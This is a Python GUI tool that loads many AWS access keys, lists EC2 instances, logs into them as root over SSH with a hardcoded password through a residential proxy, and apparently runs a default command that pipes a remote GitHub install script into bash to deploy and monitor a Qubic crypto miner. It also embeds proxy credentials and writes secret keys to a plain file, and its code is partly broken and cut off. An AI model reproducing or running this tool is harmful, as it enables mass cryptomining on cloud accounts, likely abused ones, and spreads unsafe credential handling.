import tkinter as tk
from tkinter import ttk
from tkinter import messagebox, scrolledtext
import boto3
import paramiko
from concurrent.futures import ThreadPoolExecutor
import threading
import logging
import pyperclip
from tkinter import simpledialog
import os
import socket
import socks
from urllib.parse import urlparse


# 设置日志
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# 使用线程池
pool_1 = ThreadPoolExecutor(max_workers=6)  # 一号线程池：获取实例基础信息（IP、内网IP、区域）
pool_2 = ThreadPoolExecutor(max_workers=8)  # 二号线程池：执行 SSH 命令（适当放大）
pool_3 = ThreadPoolExecutor(max_workers=10)  # 三号线程池：获取 CPU、内存、Top1进程信息
pool_4 = ThreadPoolExecutor(max_workers=8)  # 四号线程池：重复获取  无IP实例的IP
class AWSManagerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("AWS 管理程序")
        # 初始化字典来存储可以通过邮箱查找的 AWS 密钥
        self.aws_keys_dict = {}  # 存储 email -> (access_key, secret_key)

        self.search_matches = []  # 存储所有匹配项
        self.current_match_index = -1  # 当前显示的匹配项索引
        
        # 存储已处理的 AWS Key（通过集合去重）
        self.aws_keys_set = set()

        # SSH 汇总统计锁与状态（每次执行 SSH 前会重置）
        self.ssh_summary_lock = threading.Lock()
        self.ssh_summary_pending = 0
        self.ssh_summary = {"total": 0, "success": 0, "fail": 0, "failures": []}
        
        # 新增：批量 SSH 日志文件
        self.ssh_log_file = "ssh_task_log.txt"
        # 启动时清空日志文件
        with open(self.ssh_log_file, "w", encoding="utf-8") as f:
            f.write(f"批量 SSH 日志 {self.ssh_log_file} 开始记录\n")
        


        # 设置窗口自适应
        for i in range(16):
            weight = 3 if i in [1, 8, 9] else 1
            self.root.grid_rowconfigure(i, weight=weight)

        # 增加对列配置的调整，确保底部按钮显示完整
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_columnconfigure(4, weight=1)  # 让第4列自适应
        self.root.grid_columnconfigure(5, weight=1)  # 让第5列自适应
        self.root.grid_columnconfigure(6, weight=1)  # 让第6列自适应
        self.root.grid_columnconfigure(7, weight=1)  # 让第7列自适应

        # AWS Key 输入框（改为 Text 组件，支持多行和滚动）
        self.key_label = tk.Label(root, text="请输入AWS Key（格式：email----access----secret，多个账号每行一个）")
        self.key_label.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        self.aws_keys_text = tk.Text(root, height=8, width=70)
        self.aws_keys_text.grid(row=1, column=0, padx=10, pady=5, sticky="ew")

        # 代理输入框
        self.proxy_label = tk.Label(root, text="请输入代理地址")
        self.proxy_label.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        self.proxy_entry = tk.Entry(root, width=70)
        self.proxy_entry.insert(0, "http://yhvbjsyeu54467-zone-abc-region-US:hhdjshs7@na.1fa7a9d3999e70e8.abcproxy.vip:4950")  # 默认代理
        self.proxy_entry.grid(row=3, column=0, padx=10, pady=5, sticky="ew")

        # SSH 命令输入框
        self.ssh_command_label = tk.Label(root, text="请输入SSH命令")
        self.ssh_command_label.grid(row=4, column=0, padx=10, pady=5, sticky="w")
        self.ssh_command_entry = tk.Entry(root, width=70)
        self.ssh_command_entry.grid(row=5, column=0, padx=10, pady=5, sticky="ew")
        default_command = "wget https://raw.githubusercontent.com/shishen12138/ssyml/main/install.sh -O - | bash"
        self.ssh_command_entry.insert(0, default_command)

        # 导入实例按钮
        self.import_button = tk.Button(root, text="导入实例", command=self.import_instances)
        self.import_button.grid(row=6, column=0, padx=10, pady=5, sticky="ew")

        # 执行 SSH 命令按钮
        self.ssh_button = tk.Button(root, text="执行 SSH 命令", command=self.execute_ssh_commands)
        self.ssh_button.grid(row=7, column=0, padx=10, pady=5, sticky="ew")

        # 初始化状态变量
        self.is_paused = False

        # 实例列表显示区域（Treeview）
        self.instance_data = []

        # 创建父容器
        self.canvas_frame = tk.Frame(self.root)
        self.canvas_frame.grid(row=8, column=0, padx=10, pady=5, sticky="nsew")
        self.canvas_frame.grid_rowconfigure(0, weight=1)
        self.canvas_frame.grid_columnconfigure(0, weight=1)

        # Treeview 列定义：将最后一列改为 Email
        columns = ("Instance ID", "IP Address", "Private IP", "Region", "Username", "Password",
                   "CPU Usage", "Memory Usage", "Top Process", "Miner Version", "Email")
        self.tree = ttk.Treeview(self.canvas_frame, columns=columns, show="headings")
        self.tree.bind("<Double-1>", self.on_item_double_click)
        self.tree.bind("<Button-3>", self.on_item_right_click)

        # 设置列标题和宽度
        headings = ["Instance ID", "IP Address", "Private IP", "Region", "Username", "Password",
                    "CPU Usage", "Memory Usage", "Top Process", "Miner Version", "Email"]
        for i, h in enumerate(headings, 1):
            self.tree.heading(f"#{i}", text=h)
            # 更合理的列宽配置
            width = 160 if i in [1, 2, 3] else (140 if i in [9] else 100)
            self.tree.column(f"#{i}", width=width, stretch=True)

        self.tree.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
        self.scrollbar = tk.Scrollbar(self.canvas_frame, orient="vertical", command=self.tree.yview)
        self.scrollbar.grid(row=0, column=1, sticky="ns")
        self.tree.configure(yscrollcommand=self.scrollbar.set)

        # 日志框
        self.log_label = tk.Label(root, text="操作日志")
        self.log_label.grid(row=9, column=0, padx=10, pady=5, sticky="w")
        self.log_box = scrolledtext.ScrolledText(root, height=12, width=120)
        self.log_box.grid(row=10, column=0, padx=10, pady=5, sticky="ew")

        # 统计信息显示
        self.stats_label = tk.Label(root, text="账号/实例/IP统计")
        self.stats_label.grid(row=11, column=0, padx=10, pady=5, sticky="w")
        self.stats_info = tk.Label(root, text="账号: 0 实例: 0 有IP: 0 没IP: 0 CPU低于50%: 0")
        self.stats_info.grid(row=12, column=0, padx=10, pady=5, sticky="w")

        # 底部按钮框
        self.bottom_button_frame = tk.Frame(root)
        self.bottom_button_frame.grid(row=13, column=0, padx=10, pady=5, sticky="ew")
        self.pause_button = tk.Button(self.bottom_button_frame, text="暂停", command=self.pause_task)
        self.pause_button.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
        self.resume_button = tk.Button(self.bottom_button_frame, text="继续", command=self.resume_task)
        self.resume_button.grid(row=0, column=1, padx=10, pady=5, sticky="ew")
        self.select_all_button = tk.Button(self.bottom_button_frame, text="全选", command=self.select_all)
        self.select_all_button.grid(row=0, column=2, padx=10, pady=5, sticky="ew")
        self.deselect_all_button = tk.Button(self.bottom_button_frame, text="全不选", command=self.deselect_all)
        self.deselect_all_button.grid(row=0, column=3, padx=10, pady=5, sticky="ew")

        # 版本输入框
        version_frame = tk.Frame(root)
        version_frame.grid(row=14, column=0, padx=10, pady=5, sticky="w")
        self.version_label = tk.Label(version_frame, text="最新版本:")
        self.version_label.grid(row=0, column=0, padx=5)
        self.version_entry = tk.Entry(version_frame, width=15)
        self.version_entry.grid(row=0, column=1, padx=5)
        self.version_entry.insert(0, "v3.3.0")
        self.set_version_button = tk.Button(version_frame, text="设置版本", command=self.set_latest_version)
        self.set_version_button.grid(row=0, column=2, padx=5)
        self.latest_version = self.version_entry.get()

        # 搜索框及字段选择
        self.search_label = tk.Label(self.bottom_button_frame, text="搜索字段:")
        self.search_label.grid(row=0, column=4, padx=10, sticky="w")
        self.search_field = ttk.Combobox(self.bottom_button_frame, values=["Instance ID", "IP Address", "Private IP"], state="readonly", width=20)
        self.search_field.set("Instance ID")
        self.search_field.grid(row=0, column=5, padx=10, sticky="ew")
        self.search_entry = tk.Entry(self.bottom_button_frame, width=30)
        self.search_entry.grid(row=0, column=6, padx=10, sticky="ew")
        self.search_button = tk.Button(self.bottom_button_frame, text="搜索", command=self.search_instance)
        self.search_button.grid(row=0, column=7, padx=10, sticky="ew")

        # 导出内网IP按钮
        self.export_ips_button = tk.Button(self.bottom_button_frame, text="导出内网IP", command=self.export_private_ips_with_public_ip)
        self.export_ips_button.grid(row=0, column=8, padx=10, pady=5, sticky="ew")
        
        # 标签样式
        self.apply_tags()


    def set_latest_version(self):
        self.latest_version = self.version_entry.get().strip()
        self.log_box.insert(tk.END, f"已设置最新版本: {self.latest_version}\n")
        self.log_box.yview_moveto(1)

    def clear_highlight(self):
        """清除所有搜索高亮"""
        for item in self.tree.get_children():
            # 移除所有的 search_result 标签
            current_tags = list(self.tree.item(item, "tags"))
            if "search_result" in current_tags:
                current_tags.remove("search_result")
                self.tree.item(item, tags=tuple(current_tags))

    def search_instance(self):
        """搜索实例并高亮显示匹配项"""
        
        def clean_text(s):
            """只保留字母和数字"""
            return ''.join(c for c in s if c.isalnum()) if s else ''

        search_text = self.search_entry.get().strip()
        search_field = self.search_field.get()

        if not search_text:
            messagebox.showwarning("警告", "请输入搜索内容！")
            return

        search_text_clean = clean_text(search_text)

        # 清除所有先前的搜索高亮
        self.clear_highlight()

        # 重置匹配项列表和当前索引
        self.search_matches = []
        self.current_match_index = -1

        # 搜索所有项
        for item in self.tree.get_children():
            values = self.tree.item(item, "values")
            if not values:
                continue

            instance_id = clean_text(values[0])
            ip_address = clean_text(values[1])
            private_ip = clean_text(values[2])

            # 按照搜索字段进行匹配
            if search_field == "Instance ID" and search_text_clean in instance_id:
                self.search_matches.append(item)
            elif search_field == "IP Address" and search_text_clean in ip_address:
                self.search_matches.append(item)
            elif search_field == "Private IP" and search_text_clean in private_ip:
                self.search_matches.append(item)

        if not self.search_matches:
            messagebox.showwarning("未找到", f"未找到符合条件的实例。")
            return

        # 初次滚动到第一个匹配项
        self.scroll_to_next_match()

    def scroll_to_next_match(self):
        """滚动到下一个匹配项"""
        if not self.search_matches:
            return

        # 更新当前匹配项的索引
        self.current_match_index = (self.current_match_index + 1) % len(self.search_matches)
        next_match = self.search_matches[self.current_match_index]

        # 高亮并滚动到该匹配项
        self.highlight_and_scroll(next_match)

    def highlight_and_scroll(self, item):
        """高亮并滚动到指定的实例项"""
        self.tree.selection_set(item)  # 选中实例
        self.tree.focus(item)  # 设置焦点
        self.tree.see(item)  # 滚动到该实例
        # 保留已有标签，附加 search_result
        current_tags = list(self.tree.item(item, "tags"))
        if "search_result" not in current_tags:
            current_tags.append("search_result")
        self.tree.item(item, tags=tuple(current_tags))
        
    def apply_tags(self):
        # 设置标签的样式
        self.tree.tag_configure("no_ip", background="yellow")
        self.tree.tag_configure("low_cpu", background="red")
        self.tree.tag_configure("search_result", background="lightgreen")

    def on_item_double_click(self, event):
        item = self.tree.focus()
        column = self.tree.identify_column(event.x)
        if column in ("#5", "#6"):  # 用户名或密码列允许修改
            col_index = int(column[1:]) - 1
            value = self.tree.item(item, "values")[col_index]
            new_value = simpledialog.askstring("修改", f"请输入新的值", initialvalue=value)
            if new_value is not None:
                values = list(self.tree.item(item, "values"))
                values[col_index] = new_value
                self.tree.item(item, values=values)

    def on_item_right_click(self, event):
        item = self.tree.identify('item', event.x, event.y)
        column = self.tree.identify_column(event.x)
        if not item:
            return
        if column in ("#2", "#3"):
            col_index = int(column[1:]) - 1
            ip_address = self.tree.item(item, "values")[col_index]
            if ip_address and ip_address != "无":
                try:
                    pyperclip.copy(ip_address)
                    messagebox.showinfo("复制成功", f"IP {ip_address} 已复制到剪贴板")
                except Exception as e:
                    messagebox.showwarning("复制失败", f"无法复制到剪贴板: {e}")
    def connect_with_fallback(self, ip_address, username, password):
        """
        通用SSH连接方法：优先本机直连，失败后自动使用代理重试。
        返回 (ssh对象, 连接说明字符串)
        """


        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # ---------- 尝试直连 ----------
        try:
            ssh.connect(ip_address, username=username, password=password, timeout=20)
            return ssh, "直连成功"
        except Exception as e1:
            msg_direct = str(e1)
            self.root.after(0, self.log_box.insert, tk.END,
                            f"[{ip_address}] 本机直连失败，尝试代理连接... 原因: {msg_direct}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

        # ---------- 尝试代理连接 ----------
        try:
            proxy_str = self.proxy_entry.get().strip()
            if not proxy_str:
                raise Exception("代理地址为空")

            parsed = urlparse(proxy_str)
            proxy_type = parsed.scheme.lower()
            proxy_host = parsed.hostname
            proxy_port = parsed.port or (1080 if "socks" in proxy_type else 8080)
            proxy_user = parsed.username
            proxy_pass = parsed.password

            proxy_kind = socks.SOCKS5 if "socks5" in proxy_type else (
                socks.SOCKS4 if "socks4" in proxy_type else socks.HTTP
            )

            sock = socks.socksocket()
            sock.set_proxy(proxy_kind, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
            sock.connect((ip_address, 22))
            ssh.connect(ip_address, username=username, password=password, sock=sock, timeout=25)
            return ssh, "代理连接成功"

        except Exception as e2:
            msg_proxy = str(e2)
            self.root.after(0, self.log_box.insert, tk.END,
                            f"[{ip_address}] SSH连接失败：直连与代理均失败，原因: {msg_proxy}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)
            return None, None

    def import_instances(self):
        aws_keys_input = self.aws_keys_text.get("1.0", tk.END).strip()
        proxy = self.proxy_entry.get().strip()

        if not aws_keys_input or not proxy:
            messagebox.showerror("错误", "请输入所有字段！")
            return

        # 清空旧实例列表和数据
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.instance_data.clear()
        self.aws_keys_set.clear()

        # 日志
        self.log_box.insert(tk.END, "清空旧实例列表，开始导入新的实例...\n")
        self.log_box.insert(tk.END, f"接收到 AWS Key:\n{aws_keys_input}\n")
        self.log_box.insert(tk.END, f"代理: {proxy}\n")
        self.log_box.insert(tk.END, "开始提交任务到线程池...\n")
        self.log_box.yview_moveto(1)

        aws_keys_lines = aws_keys_input.splitlines()
        for aws_keys in aws_keys_lines:
            if aws_keys.strip():
                # 直接存储 AWS 密钥到字典中
                self.log_box.insert(tk.END, f"正在提交 AWS Key: {aws_keys} 到线程池\n")
                self.log_box.yview_moveto(1)

                # 存储到字典中，email 作为键，(access_key, secret_key) 作为值
                aws_keys_parts = aws_keys.strip().split('----')
                if len(aws_keys_parts) == 3:
                    email = aws_keys_parts[0]
                    access_key = aws_keys_parts[1]
                    secret_key = aws_keys_parts[2]

                    # 将 AWS 密钥直接存储到字典
                    self.aws_keys_dict[email] = (access_key, secret_key)

                # 提交任务到线程池，传递 email 作为唯一标识
                pool_1.submit(self.fetch_instances, aws_keys, proxy)

        # 启动 IP 重试定时任务（只需调用一次）
        self.start_ip_retry_task()

        # 设置 2 小时后自动重新导入
        self.root.after(2 * 60 * 60 * 1000, self.import_instances)

    def fetch_instances(self, aws_keys, proxy):
        try:
            aws_keys_list = aws_keys.split("----")
            if len(aws_keys_list) < 3:
                self.root.after(0, self.log_box.insert, tk.END, f"AWS Key 格式错误：{aws_keys}\n")
                return
            access_key = aws_keys_list[1]
            secret_key = aws_keys_list[2]
            email = aws_keys_list[0].strip()

            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name="us-east-1"
            )
            ec2_config = boto3.session.Config(proxies={'http': proxy, 'https': proxy})

            self.root.after(0, self.log_box.insert, tk.END, f"线程池任务开始：正在使用 AWS Key: {email} 获取实例信息\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

            self.aws_keys_set.add(aws_keys)
            added_instances = set()
            total_instance_count = 0

            preferred_regions = ["us-east-1", "us-east-2", "us-west-1", "us-west-2"]

            for region_name in preferred_regions:
                retries = 3  # 最大重试次数
                attempt = 0
                success = False

                while attempt < retries and not success:
                    try:
                        ec2_region = session.client("ec2", region_name=region_name, config=ec2_config)
                        instances = ec2_region.describe_instances()
                        success = True  # 成功连接后设置为 True
                    except Exception as e:
                        attempt += 1
                        if attempt < retries:
                            self.root.after(0, self.log_box.insert, tk.END, f"账号 {email} - 无法连接区域 {region_name}，正在重试 ({attempt}/{retries})：{str(e)}\n")
                            self.root.after(0, self.log_box.yview_moveto, 1)
                            time.sleep(5)  # 等待 5 秒后重试
                        else:
                            self.root.after(0, self.log_box.insert, tk.END, f"账号 {email} - 无法连接区域 {region_name}，已达到最大重试次数：{str(e)}\n")
                            self.root.after(0, self.log_box.yview_moveto, 1)
                            continue

                    # 如果成功连接并获取实例信息
                    if success:
                        region_instance_count = 0
                        for reservation in instances.get("Reservations", []):
                            for instance in reservation.get("Instances", []):
                                instance_id = instance["InstanceId"]
                                ip_address = instance.get("PublicIpAddress", "无")
                                private_ip = instance.get("PrivateIpAddress", "无")
                                availability_zone = instance["Placement"].get("AvailabilityZone", "无")
                                # 过滤掉 terminated 实例
                                state = instance.get("State", {}).get("Name", "").lower()
                                if state == "terminated":
                                    continue  # 直接跳过，不加入 Treeview

                                if (aws_keys, instance_id) not in added_instances:
                                    added_instances.add((aws_keys, instance_id))
                                    region_instance_count += 1
                                    total_instance_count += 1

                                    # 提交线程池获取 CPU/内存/Top1（把 aws_keys 也传进去）
                                    pool_3.submit(self.fetch_instance_details, instance_id, ip_address, private_ip, availability_zone, aws_keys)

                                    # 更新 Treeview（主线程）
                                    self.root.after(0, self.add_instance_to_list, instance_id, ip_address, private_ip, availability_zone, aws_keys)

                        if region_instance_count > 0:
                            self.root.after(0, self.log_box.insert, tk.END, f"账号 {email} 区域 {region_name} 获取到 {region_instance_count} 个实例\n")
                            self.root.after(0, self.log_box.yview_moveto, 1)

            if total_instance_count == 0:
                self.root.after(0, self.log_box.insert, tk.END, f"账号 {email} 在首选区域未获取到任何实例\n")
            else:
                self.root.after(0, self.log_box.insert, tk.END, f"账号 {email} 总共获取到 {total_instance_count} 个实例\n")
            self.root.after(0, self.log_box.insert, tk.END, "实例导入完成。\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

            # 更新统计信息
            self.root.after(0, self.update_statistics)

        except Exception as e:
            self.root.after(0, self.log_box.insert, tk.END, f"账号 {aws_keys} - 错误: {str(e)}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)


    def fetch_instance_details(self, instance_id, ip_address, private_ip, region_name, aws_keys):
        """
        周期性获取并更新实例详情（CPU、内存、Top1、miner 版本、Email）
        aws_keys: 原始字符串，格式 email----access----secret
        """
        def fetch_and_update():
            ssh = None
            # 使用新的局部变量，避免闭包作用域问题
            current_ip = ip_address if ip_address != "无" else ""
            current_private_ip = private_ip if private_ip != "无" else ""
            email = aws_keys.split("----")[0].strip() if aws_keys and "----" in aws_keys else aws_keys

            try:
                if not current_ip:
                    # 无公网 IP，不做 SSH 检测，但仍在 Treeview 中显示 email
                    self.root.after(0, self.update_instance_in_list,
                                    instance_id, "", current_private_ip, region_name,
                                    None, None, None, None, email)
                    return

                ssh, conn_info = self.connect_with_fallback(current_ip, "root", "Qcy1994@06")
                if not ssh:
                    raise Exception("SSH连接失败")

                self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] {conn_info}\n")
                self.root.after(0, self.log_box.yview_moveto, 1)

                # 获取当前服务器的真实外网 IP
                stdin, stdout, stderr = ssh.exec_command(
                    "curl -s https://checkip.amazonaws.com || curl -s ifconfig.me || wget -qO- https://api.ipify.org"
                )
                real_ip = stdout.read().decode().strip()
                if real_ip:
                    current_ip = real_ip
                else:
                    real_ip_err = stderr.read().decode().strip()
                    self.root.after(0, self.log_box.insert, tk.END, f"[{instance_id}] 获取外网IP失败: {real_ip_err}\n")

                # 获取 CPU 使用率
                stdin, stdout, stderr = ssh.exec_command(r"top -bn1 | grep '%Cpu'")
                cpu_output = stdout.read().decode().strip()
                cpu_usage = 0.0
                if cpu_output:
                    try:
                        idle_cpu_percentage = float(cpu_output.split("id,")[0].split()[-1])
                        cpu_usage = 100.0 - idle_cpu_percentage
                    except ValueError:
                        cpu_usage = 0.0

                # 获取内存使用率
                stdin, stdout, stderr = ssh.exec_command("free | grep Mem | awk '{print $3/$2 * 100.0}'")
                memory_output = stdout.read().decode().strip()
                memory_usage = 0.0
                if memory_output:
                    try:
                        memory_usage = float(memory_output)
                    except ValueError:
                        memory_usage = 0.0

                # 获取 Top 1 进程
                stdin, stdout, stderr = ssh.exec_command("ps aux --sort=-%cpu | head -n 2 | tail -n 1")
                top1_process_output = stdout.read().decode().strip()
                top1_process = "无"
                if top1_process_output:
                    parts = top1_process_output.split()
                    if len(parts) >= 11:
                        top1_process = parts[10]

                # 检测 miner 版本
                stdin, stdout, stderr = ssh.exec_command("basename /root/apoolminer_linux_qubic_autoupdate_v3.3.0")
                miner_path = stdout.read().decode().strip()
                miner_version = "未安装"
                if miner_path:
                    if "v" in miner_path:
                        miner_version = miner_path.split("_")[-1]
                    else:
                        miner_version = miner_path

                # 更新 Treeview
                self.root.after(0, self.update_instance_in_list,
                                instance_id, current_ip, current_private_ip, region_name,
                                cpu_usage, memory_usage, top1_process, miner_version, email)

            except Exception as e:
                self.root.after(0, self.log_box.insert, tk.END,
                                f"账号 {email} - 无法连接实例 {instance_id}: {e}\n")
                self.root.after(0, self.log_box.yview_moveto, 1)
                # 仍更新 email（即使无法 SSH）
                self.root.after(0, self.update_instance_in_list,
                                instance_id, current_ip, current_private_ip, region_name,
                                None, None, None, None, email)
            finally:
                if ssh:
                    ssh.close()

                # 如果没有暂停，则周期性检查
                if not self.is_paused:
                    pool_3.submit(fetch_and_update)

        # 首次立即提交一次检查
        pool_3.submit(fetch_and_update)


    def add_instance_to_list(self, instance_id, ip_address, private_ip, region_name, aws_keys, cpu_usage="N/A", memory_usage="N/A", top1_process="N/A", miner_version="N/A"):
        # 显示 email（从 aws_keys 里拆）
        email = aws_keys.split("----")[0].strip() if aws_keys and "----" in aws_keys else aws_keys

        values = (
            instance_id,
            ip_address if ip_address != "无" else "",
            private_ip if private_ip != "无" else "",
            region_name,
            "root",
            "Qcy1994@06",
            f"{cpu_usage}%" if isinstance(cpu_usage, (int, float)) else (cpu_usage if cpu_usage != "N/A" else "N/A"),
            f"{memory_usage}%" if isinstance(memory_usage, (int, float)) else (memory_usage if memory_usage != "N/A" else "N/A"),
            top1_process,
            miner_version,
            email
        )

        item = self.tree.insert("", "end", values=values)

        # 保存到 instance_data，方便重试更新
        self.instance_data.append({
            "Instance ID": instance_id,
            "IP Address": ip_address if ip_address != "无" else "",
            "Private IP": private_ip if private_ip != "无" else "",
            "Region": region_name,
            "AWS Key": aws_keys
        })

        # 更新 item 标签（无公网 IP 标记）
        self.update_item_tags(item, ip_address if ip_address != "无" else "", None)

    def start_ip_retry_task(self):
        """启动周期性任务"""
        self.retry_ip_task()

    def retry_ip_task(self):
        """遍历没有公网IP的实例，提交线程池异步获取IP"""
        for idx, inst in enumerate(list(self.instance_data)):
            instance_id = inst.get("Instance ID")
            current_ip = inst.get("IP Address")
            aws_keys = inst.get("AWS Key")
            region = inst.get("Region") or "us-east-1"

            if current_ip or not aws_keys:
                continue

            # 自动修复 region，例如 us-east-1a → us-east-1
            region_fixed = region
            if region and region[-1].isalpha() and region[-2].isdigit():
                region_fixed = region[:-1]

            # 异步提交到线程池
            pool_4.submit(self._retry_single_ip, idx, instance_id, aws_keys, region_fixed)

        # 5分钟后再次执行
        self.root.after(5 * 60 * 1000, self.retry_ip_task)

    def _retry_single_ip(self, idx, instance_id, aws_keys, region_fixed):
        """后台线程：重新获取实例公网/私网IP并更新"""
        new_ip, new_private_ip = self.fetch_instance_ip(instance_id, aws_keys, region_fixed)

        if new_ip:
            with self.instance_data_lock:
            # 更新内存数据
                self.instance_data[idx]["IP Address"] = new_ip
                self.instance_data[idx]["Private IP"] = new_private_ip or ""

            # 回到主线程更新 Treeview
            def update_ui():
                for item in self.tree.get_children():
                    if self.tree.item(item, "values")[0] == instance_id:
                        self.tree.set(item, "IP Address", new_ip)
                        self.tree.set(item, "Private IP", new_private_ip or "")
                        # 清除标签，让行恢复默认背景
                        self.tree.item(item, tags=())
                        break
            self.root.after(0, update_ui)
        else:
            # 获取失败写日志
            self.root.after(0, self.log_box.insert, tk.END,
                            f"[IP重试] {instance_id} 获取失败 ({region_fixed})\n")
            self.root.after(0, self.log_box.yview_moveto, 1)

    def fetch_instance_ip(self, instance_id, aws_keys, region_name):
        """根据实例ID和 AWS Key 获取公网/私网IP"""
        try:
            parts = aws_keys.split("----")
            if len(parts) < 3:
                raise ValueError("AWS Key 格式异常")

            access_key = parts[1].strip()
            secret_key = parts[2].strip()

            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region_name  # 使用传入的实例区域
            )
            ec2 = session.client("ec2")
            resp = ec2.describe_instances(InstanceIds=[instance_id])
            reservations = resp.get("Reservations", [])
            if reservations:
                instance = reservations[0]["Instances"][0]
                return instance.get("PublicIpAddress"), instance.get("PrivateIpAddress")

        except Exception as e:
            self.root.after(0, self.log_box.insert, tk.END,
                            f"获取实例 {instance_id} IP 失败: {e}\n")
            self.root.after(0, self.log_box.yview_moveto, 1)
        return None, None
        
    def export_private_ips_with_public_ip(self):
        file_path = r"C:\Users\Administrator\Desktop\my_ips.txt"
        duplicate_file_path = r"C:\Users\Administrator\Desktop\my_ips1.txt"
        ip_count = {}  # 用字典统计每个 IP 的出现次数
        ip_data = {}   # 用字典存储每个 IP 的详细信息
        exported_count = 0
        duplicate_count = 0

        try:
            # 遍历所有的 treeview 数据，进行统计
            for item in self.tree.get_children():
                values = self.tree.item(item, "values")
                public_ip = values[1].strip()  # 外网 IP
                private_ip = values[2].strip()  # 内网 IP
                instance_id = values[0].strip()  # 实例 ID
                region_name = values[3].strip()  # 区域信息
                cpu_usage = values[6].strip() if values[6] != "N/A" else None  # CPU 使用率
                memory_usage = values[7].strip() if values[7] != "N/A" else None  # 内存使用率
                top1_process = values[8].strip()  # 顶级进程
                miner_version = values[9].strip()  # 矿工版本
                email = values[10].strip()  # 邮箱

                # 通过 email 获取 access_key 和 secret_key
                if email in self.aws_keys_dict:
                    access_key, secret_key = self.aws_keys_dict[email]
                else:
                    # 如果没有找到对应的 AWS Key，使用默认值
                    access_key = "N/A"
                    secret_key = "N/A"

                # 更新 IP 统计
                ip_count[private_ip] = ip_count.get(private_ip, 0) + 1

                # 存储每个 IP 的详细信息，增加实例 ID
                if private_ip not in ip_data:
                    ip_data[private_ip] = []
                ip_data[private_ip].append({
                    "public_ip": public_ip,
                    "instance_id": instance_id,
                    "region_name": region_name,
                    "cpu_usage": cpu_usage,
                    "memory_usage": memory_usage,
                    "top1_process": top1_process,
                    "miner_version": miner_version,
                    "email": email,
                    "access_key": access_key,
                    "secret_key": secret_key
                })

            # 开始导出数据
            with open(file_path, "w", encoding="utf-8") as file, open(duplicate_file_path, "w", encoding="utf-8") as duplicate_file:
                for private_ip, count in ip_count.items():
                    ip_details = ip_data[private_ip]  # 获取该 IP 的所有详细信息

                    # 如果该 IP 出现 2 次或以上，算为重复，写入重复文件
                    if count >= 2:
                        for details in ip_details:
                            public_ip = details["public_ip"]
                            instance_id = details["instance_id"]
                            region_name = details["region_name"]
                            cpu_usage = details["cpu_usage"]
                            memory_usage = details["memory_usage"]
                            top1_process = details["top1_process"]
                            miner_version = details["miner_version"]
                            email = details["email"]
                            access_key = details["access_key"]
                            secret_key = details["secret_key"]

                            # 写入重复文件，按照要求的格式
                            duplicate_file.write(f"{email}----{access_key}----{secret_key}----{instance_id}----"
                                                 f"{region_name}----{public_ip}----{private_ip}----{cpu_usage if cpu_usage else 'N/A'}----"
                                                 f"{memory_usage if memory_usage else 'N/A'}----{top1_process}----{miner_version}\n")
                        duplicate_count += count
                    else:
                        # 否则只写入内网 IP 到主文件，不写其他详细信息
                        file.write(f"{private_ip}\n")
                        exported_count += 1

            # 日志输出
            self.log_box.insert(tk.END, f"导出完成！共导出 {exported_count} 条内网 IP，文件路径：{file_path}\n")
            self.log_box.insert(tk.END, f"重复的内网 IP 共 {duplicate_count} 条，已写入文件：{duplicate_file_path}\n")
            self.log_box.yview_moveto(1)

        except Exception as e:
            self.log_box.insert(tk.END, f"导出失败: {e}\n")
            self.log_box.yview_moveto(1)


            
    def update_instance_in_list(self, instance_id, ip_address=None, private_ip=None, region_name=None, cpu_usage=None, memory_usage=None, top1_process=None, miner_version=None, email=None):
        # 查找已存在的实例并更新数据
        for item in self.tree.get_children():
            if self.tree.item(item, "values")[0] == instance_id:
                values = list(self.tree.item(item, "values"))

                # 更新基本信息
                if ip_address is not None:
                    values[1] = ip_address if ip_address else ""
                if private_ip is not None:
                    values[2] = private_ip if private_ip else ""
                if region_name is not None:
                    values[3] = region_name

                # 更新监控信息（若非 None 则替换）
                if cpu_usage is not None:
                    if isinstance(cpu_usage, (int, float)):
                        values[6] = f"{cpu_usage}%"
                    else:
                        values[6] = cpu_usage if cpu_usage else "N/A"
                if memory_usage is not None:
                    if isinstance(memory_usage, (int, float)):
                        values[7] = f"{memory_usage}%"
                    else:
                        values[7] = memory_usage if memory_usage else "N/A"
                if top1_process is not None:
                    values[8] = top1_process
                if miner_version is not None:
                    values[9] = miner_version
                if email is not None:
                    values[10] = email

                # 保存回 Treeview
                self.tree.item(item, values=tuple(values))

                # 更新 instance_data 中的信息（IP/Private IP/Region）
                for inst in self.instance_data:
                    if inst.get("Instance ID") == instance_id:
                        if ip_address is not None:
                            inst["IP Address"] = ip_address if ip_address else ""
                        if private_ip is not None:
                            inst["Private IP"] = private_ip if private_ip else ""
                        if region_name is not None:
                            inst["Region"] = region_name
                        break

                # 更新标签（ip 和 cpu 用于判断）
                # 提取 cpu 数值用于判断
                cpu_val = None
                try:
                    cpu_str = values[6]
                    if cpu_str and cpu_str not in ("N/A", ""):
                        cpu_val = float(str(cpu_str).replace("%", "").strip())
                except Exception:
                    cpu_val = None

                self.update_item_tags(item, values[1], cpu_val)
                break

    def update_item_tags(self, item, ip_address, cpu_usage):
        # ip_address 为空 或 False 则标记 no_ip
        if not ip_address:
            self.tree.item(item, tags=("no_ip",))
        else:
            # cpu_usage 如果数值小于 50 则 low_cpu
            try:
                if cpu_usage is not None and float(cpu_usage) < 50.0:
                    self.tree.item(item, tags=("low_cpu",))
                else:
                    self.tree.item(item, tags=())
            except Exception:
                self.tree.item(item, tags=())

    def update_statistics(self):
        total_instances = len(self.tree.get_children())
